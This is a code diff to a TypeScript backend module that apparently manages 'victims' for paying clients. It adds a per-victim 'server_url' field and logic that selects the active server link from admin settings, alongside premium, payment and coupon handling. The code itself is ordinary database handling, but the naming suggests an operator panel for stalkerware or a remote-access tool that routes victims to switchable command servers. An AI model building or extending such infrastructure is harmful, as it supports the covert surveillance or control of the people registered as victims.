@@ -56,7 +56,9 @@ export interface Child {
   is_Premium: boolean;
   premium_id?: string | null;
   ending_date?: string | null;
+  server_url?: string | null;
 }
+
 
 export interface Payment {
   $id: string;
@@ -307,7 +309,9 @@ export async function updateUserIsInitial(userId: string, isInitial: boolean) {
   );
 }
 
-export async function createChild(form: { client_id: string; victim_name: string; victim_id: string }): Promise<Child> {
+export async function createChild(form: { client_id: string; victim_name: string; victim_id: string; server_url?: string }): Promise<Child> {
+  const activeServerUrl = form.server_url || (await getActiveServerUrl().catch(() => ''));
+
   const newChild = await databases.createDocument(
     appwriteConfig.databaseId,
     appwriteConfig.childCollectionId,
@@ -317,11 +321,13 @@ export async function createChild(form: { client_id: string; victim_name: string
       victime_name: form.victim_name,
       victim_id: form.victim_id,
       is_Premium: false,
+      server_url: activeServerUrl || null,
     }
   );
 
   return newChild as unknown as Child;
 }
+
 
 export async function updateChild(id: string, isPremium: boolean = true, premiumId: string | null = null, endingDate: string | null = null): Promise<Child> {
   const updatedChild = await databases.updateDocument(
@@ -445,9 +451,35 @@ export async function getAdminSetting(key: string): Promise<AdminSetting | null>
 
 export async function getActiveServerUrl(): Promise<string> {
   const fallbackUrl = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001';
-  const setting = await getAdminSetting('server_url');
-  return (setting?.value || fallbackUrl).trim().replace(/\/$/, '');
+  try {
+    const result = await databases.listDocuments(
+      appwriteConfig.databaseId,
+      appwriteConfig.adminSettingsCollectionId,
+      [Query.equal('is_active', true), Query.limit(20)]
+    );
+
+    const activeServerLink = result.documents.find((d: any) => d.key === 'server_link');
+    if (activeServerLink) {
+      let parsed: any = {};
+      try {
+        parsed = typeof activeServerLink.value === 'string' && activeServerLink.value.startsWith('{')
+          ? JSON.parse(activeServerLink.value)
+          : { url: activeServerLink.value };
+      } catch {
+        parsed = { url: activeServerLink.value };
+      }
+      if (parsed.url) return parsed.url.trim().replace(/\/$/, '');
+    }
+
+    const legacySetting = result.documents.find((d: any) => d.key === 'server_url');
+    if (legacySetting?.value) return legacySetting.value.trim().replace(/\/$/, '');
+
+    return fallbackUrl;
+  } catch {
+    return fallbackUrl;
+  }
 }
+
 
 export async function getCoupons(): Promise<Coupon[]> {
   try {
